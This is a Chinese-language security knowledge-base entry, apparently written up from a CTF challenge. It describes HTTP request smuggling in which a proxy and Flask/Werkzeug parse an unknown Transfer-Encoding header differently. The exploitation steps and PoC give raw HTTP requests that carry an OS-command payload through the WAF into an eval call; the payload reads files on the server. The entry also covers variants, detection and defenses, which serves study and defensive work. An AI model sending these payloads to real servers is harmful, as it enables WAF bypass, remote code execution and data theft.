---
id: web-generic-http-smuggling-unknown-te-cl-differential
title: 未知 Transfer-Encoding 解析差异走私：代理按 chunked 截断、Flask 按 Content-Length 读全 body 绕过 WAF
type: scenario
domain: web
path: web/generic/http-smuggling
technique: unknown-te-cl-parsing-differential-smuggling
tags:
- http
- smuggling
- request-smuggling
- transfer-encoding
- content-length
- flask
- werkzeug
- waf-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V196
  verified_at: '2026-11-06T22:48:35+08:00'
  notes: 已对照原文与截图核对：代理见 TE 头即按 chunked、0 处停止检查并原样转发、Werkzeug 对未知 TE 回退 CL、CL:49 的 0\r\n&calc=... payload、标准 chunked 504 与 TE:xxx 200 出 flag 均一致；无 affected_versions（CTF 应用）；无 sources 字段；未复跑
url: /docs/web/generic/http-smuggling/web-generic-http-smuggling-unknown-te-cl-differential/
draft: false
kb_aliases:
- 未知 TE 走私
- Transfer-Encoding xxx
- CL.TE 解析差异
- Flask Werkzeug 忽略未知 TE
- 代理 chunked 解析绕过 WAF
- HTTP 请求走私
---

## 一句话结论

前置代理只要看到 `Transfer-Encoding` 头存在（无论值是什么）就按 chunked 解析请求体，并在第一个 `0\r\n` 处停止检查；后端 Flask/Werkzeug 对未知的 `Transfer-Encoding: xxx` 会忽略该头、改用 `Content-Length` 读取完整 body；攻击者把恶意参数放在 `0\r\n` 之后，即可让 WAF 看不到、后端却执行，形成 CL.TE 走私。

## 原理

- **前端代理解析**：示例代理用 Python socket 手写 HTTP 解析，逻辑是 `if transfer_encoding:`（只判断头是否存在，不校验值）就进入 chunked 解析；遇到 chunk size `0` 时认为 body 结束，后续字节不再做黑名单检查。
- **后端 Flask/Werkzeug 解析**：Werkzeug 只对标准的 `Transfer-Encoding: chunked` 做分块解码；对未知值（如 `xxx`、`identity`、`gzip`）会忽略 `Transfer-Encoding`，按 `Content-Length` 决定 body 长度。
- **解析差异**：同一请求被前端截断在 `0\r\n`，后端却按 CL 读取 `0\r\n&calc=...` 的整体；WAF 只检查了前端认为的 body（可能是空/`0`），恶意参数 `&calc=...` 落在“前端不检查、后端读取”的区间。
- **触发链路**：代理 → 黑名单检查 → 原样转发 `request_data` 到 Flask 3001 → Flask `eval(request.form.get('calc'))`；走私的 POST 参数被 Flask 解析并执行。
- **为什么用未知 TE 而不是标准 chunked**：如果 TE 是标准 `chunked`，Flask 也会按 chunked 解析，`0\r\n` 后内容被丢弃，无法到达 `eval`；未知值让前后端选择不同解析器，才有差异。
- **CL 的作用**：`Content-Length` 必须覆盖 `0\r\n` 加恶意参数的完整长度，Flask 才读得全；代理不检查 CL 与 TE 的一致性，是走私成立的另一条件。

## 触发条件

- 存在前置代理/WAF 与后端框架对 `Transfer-Encoding` 的处理差异：代理见 TE 即按 chunked，后端只认标准 `chunked`、未知值回退 CL。
- 代理在完成自己的 body 解析后把原始字节转发给后端，未重新序列化/规范化请求。
- 后端存在危险 sink（示例为 Flask `eval`），且能从 POST body 取参数。
- 攻击者能控制 `Transfer-Encoding` 与 `Content-Length` 头及 body。
- 代理的黑名单只检查它认为的 body，未对整段原始请求做二次检查。

## 利用步骤

1. 确认代理与后端对 TE 的处理：发送 `Transfer-Encoding: chunked` 与 `Transfer-Encoding: xxx` 对比响应（标准 chunked 可能 504/被丢弃，未知值可能被后端按 CL 读取）。
2. 计算 body：`0\r\n` + 恶意参数，例如 `0\r\n&calc=__import__("os").popen("cat /f*").read()`；`Content-Length` 设为整个 body 长度。
3. 发送 POST，带 `Transfer-Encoding: xxx`、`Content-Length: <len>`；代理按 chunked 在 `0` 处停止检查，后端按 CL 读取完整 body。
4. 观察响应/命令输出；若 WAF 仍拦截，调整 chunk 大小写、空白、多个 TE 头或 CL 值。
5. 授权测试只执行 `id`/`echo` 等无害命令。

## PoC

失败对照（标准 chunked，后端也按 chunked 解析，恶意参数被丢弃）：

```http
POST /calc HTTP/1.1
Host: target
Transfer-Encoding: chunked
Content-Length: 49

0
&calc=__import__("os").popen("cat /f*").read()
```

成功 payload（未知 TE，代理 chunked 截断、Flask 按 CL 读全）：

```http
POST /calc HTTP/1.1
Host: target
Transfer-Encoding: xxx
Content-Length: 49

0
&calc=__import__("os").popen("cat /f*").read()
```

响应：

```http
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 36

flag{yoU_rE@l1Y_know_Http_$mU9911NG}
```

## 变体与关联

- TE 值变体：`xxx`、`identity`、`chunked, identity`、大小写/多余空格、多个 TE 头；目标是让前端与后端选择不同解析路径。
- CL.TE / TE.CL：调整 CL 与 chunk 边界，把恶意请求“藏”在第一个请求的 body 中，或让第二个请求被后端当作新请求处理。
- 代理实现差异：Nginx/Apache/HAProxy/自研 WAF 对未知 TE 的处理各不相同，需按目标实测。
- 关联：[[web-generic-http-smuggling-empty-cl-chunked-admin-bypass]]（空 CL + TE chunked 的前置代理绕过）。
- 关联：[[web-generic-http-smuggling-varnish-pipeline-cl-residual]]（Varnish 管线残留）。

## 检测与防御

- 拒绝同时带 `Transfer-Encoding` 与 `Content-Length` 的请求（RFC 7230 建议），或按统一规则处理。
- 代理/WAF 与后端使用同一 HTTP 解析器/同一 TE 语义；对未知 TE 值直接拒绝（400），不要“见 TE 就 chunked”。
- 代理转发前重新序列化请求，或对整段原始请求做二次黑名单检查；不要依赖前端截断后的 body。
- 后端框架升级到对 TE/CL 冲突有明确处理的版本；避免把原始请求直接转发给下游。
- 监控 `Transfer-Encoding` 非 `chunked` 的值、TE 与 CL 同时出现、body 中 `0\r\n` 后仍有数据等特征。
